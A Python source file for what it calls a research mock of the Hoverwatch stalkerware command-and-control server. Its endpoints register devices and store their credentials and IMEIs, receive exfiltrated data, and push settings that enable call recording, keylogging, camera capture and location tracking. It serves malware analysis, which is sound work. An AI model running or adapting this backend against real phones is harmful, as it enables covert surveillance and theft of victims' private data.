"""
Hoverwatch Mock C2 Server
=========================
Simulates the Hoverwatch stalkerware C2 backend based on reverse-engineered protocol.
All endpoints faithfully reproduce the real server behavior.

Usage:
    uv run uvicorn server:app --host 0.0.0.0 --port 8443 --ssl-keyfile key.pem --ssl-certfile cert.pem
    # or without SSL (app accepts anything anyway):
    uv run uvicorn server:app --host 0.0.0.0 --port 8443

Research use only — ASTRA / stalkerware analysis project.
"""

import json
import logging
import time
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, Request, Header, Response
from fastapi.responses import JSONResponse
from pydantic import BaseModel

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

MOCK_DOMAIN = "https://127.0.0.1:8443/"
MOCK_AUTH_KEY = "MOCK-1337:DEADBEEF"
MOCK_PIN = "1234"
MOCK_SUBSCRIPTION = "premium"
VALID_THROUGH = (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d %H:%M:%S")
CLIENT_VERSION = "7.5.369"
SETTINGS_VERSION = 100

LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_DIR / "c2.log"),
    ],
)
log = logging.getLogger("hoverwatch-c2")

# ---------------------------------------------------------------------------
# State — tracks registered devices
# ---------------------------------------------------------------------------

devices: dict[str, dict] = {}
exfiltrated_data: list[dict] = []

# ---------------------------------------------------------------------------
# Default settings — extracted from C0887y.m6527x()
# ---------------------------------------------------------------------------

DEFAULT_SETTINGS = {
    "version": SETTINGS_VERSION,
    "on": True,
    "debug": False,
    "onlyWiFi": False,
    "period": 10,
    "autoupdate": {"on": False},
    "location": {"on": True, "period": 10, "acc": 1000},
    "contact": {"on": True},
    "call": {
        "on": True,
        "rec": True,
        "source": 4,  # VOICE_COMMUNICATION
        "quality": 1,  # medium
        "codec": 2,
        "gain": False,
    },
    "sms": {"on": True, "shot": False},
    "chat": {"on": True, "shot": False, "rec": True},
    "url": {"on": True, "shot": False},
    "sim": {"on": False},
    "calendar": {"on": True},
    "frcam": {"on": True, "photo": True},
    "shot": {"on": False, "period": 5},
    "files": {"on": True, "shot": False},
    "app": {"on": True, "shot": False},
    "keys": {"on": True, "shot": False},
}

# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(
    title="Hoverwatch Mock C2",
    description="Research mock — simulates Hoverwatch stalkerware C2 backend",
    version="1.0.0",
)


# ---------------------------------------------------------------------------
# Middleware — log everything
# ---------------------------------------------------------------------------

@app.middleware("http")
async def log_requests(request: Request, call_next):
    body = b""
    try:
        body = await request.body()
    except Exception:
        pass

    auth_key = request.headers.get("x-auth-key", "none")
    user_agent = request.headers.get("user-agent", "unknown")
    settings_ver = request.headers.get("x-settings-ver", "none")
    client_event = request.headers.get("x-client-event", "none")

    log.info(
        ">>> %s %s | UA: %s | auth: %s | settings-ver: %s | event: %s | body: %d bytes",
        request.method,
        request.url.path,
        user_agent,
        auth_key,
        settings_ver,
        client_event,
        len(body),
    )

    if body and len(body) < 4096:
        try:
            parsed = json.loads(body)
            log.info("    JSON body: %s", json.dumps(parsed, indent=2, ensure_ascii=False))
        except (json.JSONDecodeError, UnicodeDecodeError):
            log.info("    Raw body: %s", body[:512].hex())

    # Save raw exfiltrated data
    if request.url.path in ("/api/online/logs/", "/api/online/exceptionlog/"):
        exfiltrated_data.append({
            "timestamp": datetime.now().isoformat(),
            "path": request.url.path,
            "auth_key": auth_key,
            "user_agent": user_agent,
            "body_size": len(body),
            "body_hex": body[:2048].hex() if body else "",
        })
        # Persist to disk
        with open(LOG_DIR / "exfiltrated.jsonl", "a") as f:
            f.write(json.dumps(exfiltrated_data[-1]) + "\n")

    response = await call_next(request)

    log.info(
        "<<< %s %s → %d",
        request.method,
        request.url.path,
        response.status_code,
    )

    return response


# ---------------------------------------------------------------------------
# POST /api/online/registration/
# Device registration — receives credentials + device fingerprint
# ---------------------------------------------------------------------------

@app.post("/api/online/registration/")
async def registration(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse(status_code=400, content={"status": "fail"})

    username = body.get("username", "unknown")
    password = body.get("password", "unknown")
    hid = body.get("hid", "unknown")
    device_name = body.get("device_name", "unknown")
    client_ver = body.get("client_ver", "unknown")
    imei = body.get("device.dev_imei_str", "unknown")

    # Generate auth key for this device
    auth_key = f"{username}:{uuid.uuid4().hex[:16]}"

    device_info = {
        "auth_key": auth_key,
        "username": username,
        "password": password,
        "hid": hid,
        "device_name": device_name,
        "client_ver": client_ver,
        "imei": imei,
        "registered_at": datetime.now().isoformat(),
        "raw_registration": body,
    }
    devices[auth_key] = device_info

    # Persist registration
    with open(LOG_DIR / "registrations.jsonl", "a") as f:
        f.write(json.dumps(device_info, default=str) + "\n")

    log.info(
        "🎯 DEVICE REGISTERED: user=%s hid=%s device=%s imei=%s → auth_key=%s",
        username, hid, device_name, imei, auth_key,
    )

    return JSONResponse(content={
        "status": "ok",
        "auth_key": auth_key,
        "valid_through": VALID_THROUGH,
        "subscription": MOCK_SUBSCRIPTION,
        "domains": MOCK_DOMAIN,
        "client_pin": MOCK_PIN,
        "settings": DEFAULT_SETTINGS,
    })


# ---------------------------------------------------------------------------
# POST /api/online/activation/
# License activation
# ---------------------------------------------------------------------------

@app.post("/api/online/activation/")
async def activation(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse(status_code=400, content={"status": "fail"})

    log.info("🔑 ACTIVATION request: %s", json.dumps(body, indent=2, default=str))

    return JSONResponse(content={
        "status": "ok",
        "auth_key": MOCK_AUTH_KEY,
        "valid_through": VALID_THROUGH,
        "subscription": MOCK_SUBSCRIPTION,
        "domains": MOCK_DOMAIN,
        "client_pin": MOCK_PIN,
        "settings": DEFAULT_SETTINGS,
    })


# ---------------------------------------------------------------------------
# POST /api/online/check/
# Heartbeat / ping — app checks if C2 is reachable
# ---------------------------------------------------------------------------

@app.post("/api/online/check/")
async def check(request: Request):
    auth_key = request.headers.get("x-auth-key", "")
    log.info("💓 HEARTBEAT from auth_key=%s", auth_key)
    return Response(status_code=200, content="ok")


# ---------------------------------------------------------------------------
# GET /api/online/programversion/{client_id}/
# Update check — tells the app if a new version is available
# ---------------------------------------------------------------------------

@app.get("/api/online/programversion/{client_id}/")
async def program_version(client_id: str):
    log.info("📦 UPDATE CHECK for client_id=%s", client_id)
    # Return "no update" — keep the current version running
    return Response(status_code=200, content="Update not found")

    # Uncomment to simulate an update push:
    # return JSONResponse(content={
    #     "version": "7.6.370",
    #     "download_link": "https://127.0.0.1:8443/static/update.apk",
    # })


# ---------------------------------------------------------------------------
# POST /api/online/deregistration/
# License reset
# ---------------------------------------------------------------------------

@app.post("/api/online/deregistration/")
async def deregistration(request: Request):
    auth_key = request.headers.get("x-auth-key", "")
    log.info("🗑️ DEREGISTRATION for auth_key=%s", auth_key)
    if auth_key in devices:
        del devices[auth_key]
    return Response(status_code=200)


# ---------------------------------------------------------------------------
# POST /api/online/exceptionlog/
# Exception/error logs from the stalkerware
# ---------------------------------------------------------------------------

@app.post("/api/online/exceptionlog/")
async def exception_log(request: Request):
    body = await request.body()
    auth_key = request.headers.get("x-auth-key", "")
    log.info("🐛 EXCEPTION LOG from auth_key=%s — %d bytes", auth_key, len(body))
    return Response(status_code=200, content="ok")


# ---------------------------------------------------------------------------
# POST /api/online/logs/
# THE MAIN EXFILTRATION ENDPOINT — receives all stolen data
# ---------------------------------------------------------------------------

@app.post("/api/online/logs/")
async def receive_logs(request: Request):
    body = await request.body()
    auth_key = request.headers.get("x-auth-key", "")

    log.info(
        "📡 EXFILTRATION from auth_key=%s — %d bytes of stolen data",
        auth_key,
        len(body),
    )

    # Try to parse as JSON (some payloads are JSON-wrapped)
    try:
        parsed = json.loads(body)
        log.info("    Parsed JSON payload: %s", json.dumps(parsed, indent=2, ensure_ascii=False)[:2048])
    except (json.JSONDecodeError, UnicodeDecodeError):
        # Protobuf-like binary — dump hex for analysis
        log.info("    Binary payload (first 512 bytes): %s", body[:512].hex())

        # Try to extract JSON fragments from binary
        try:
            text = body.decode("utf-8", errors="ignore")
            # Find JSON objects in the binary stream
            import re
            json_fragments = re.findall(r'\{[^{}]{10,}\}', text)
            for i, frag in enumerate(json_fragments[:10]):
                try:
                    parsed_frag = json.loads(frag)
                    log.info("    Extracted JSON fragment #%d: %s", i, json.dumps(parsed_frag, ensure_ascii=False))
                except json.JSONDecodeError:
                    log.info("    Text fragment #%d: %s", i, frag[:200])
        except Exception:
            pass

    # Save raw binary dump for offline analysis
    dump_file = LOG_DIR / f"dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{auth_key[:16]}.bin"
    with open(dump_file, "wb") as f:
        f.write(body)
    log.info("    Saved raw dump to %s", dump_file)

    return Response(status_code=200, content="ok")


# ---------------------------------------------------------------------------
# Dashboard — view registered devices and exfiltrated data count
# ---------------------------------------------------------------------------

@app.get("/")
async def dashboard():
    return JSONResponse(content={
        "server": "Hoverwatch Mock C2",
        "status": "running",
        "registered_devices": len(devices),
        "exfiltrated_payloads": len(exfiltrated_data),
        "devices": [
            {
                "auth_key": d["auth_key"],
                "username": d["username"],
                "device_name": d["device_name"],
                "imei": d.get("imei", "?"),
                "registered_at": d["registered_at"],
            }
            for d in devices.values()
        ],
    })


@app.get("/devices")
async def list_devices():
    return JSONResponse(content={"devices": list(devices.values())})


@app.get("/exfiltrated")
async def list_exfiltrated():
    return JSONResponse(content={
        "count": len(exfiltrated_data),
        "data": exfiltrated_data[-50:],  # last 50
    })


# ---------------------------------------------------------------------------
# Admin — simulate server-side actions
# ---------------------------------------------------------------------------

@app.post("/admin/kill/{auth_key}")
async def admin_kill(auth_key: str):
    """Simulate kill switch — next request from this device gets HTTP 410."""
    if auth_key in devices:
        devices[auth_key]["killed"] = True
        log.info("☠️ KILL SWITCH activated for %s", auth_key)
        return {"status": "kill_switch_armed", "auth_key": auth_key}
    return JSONResponse(status_code=404, content={"error": "device not found"})


@app.post("/admin/settings")
async def admin_update_settings(request: Request):
    """Push new settings to all devices on next sync."""
    global DEFAULT_SETTINGS
    body = await request.json()
    DEFAULT_SETTINGS.update(body)
    DEFAULT_SETTINGS["version"] = DEFAULT_SETTINGS.get("version", SETTINGS_VERSION) + 1
    log.info("⚙️ SETTINGS UPDATED: %s", json.dumps(DEFAULT_SETTINGS, indent=2))
    return {"status": "ok", "new_settings": DEFAULT_SETTINGS}
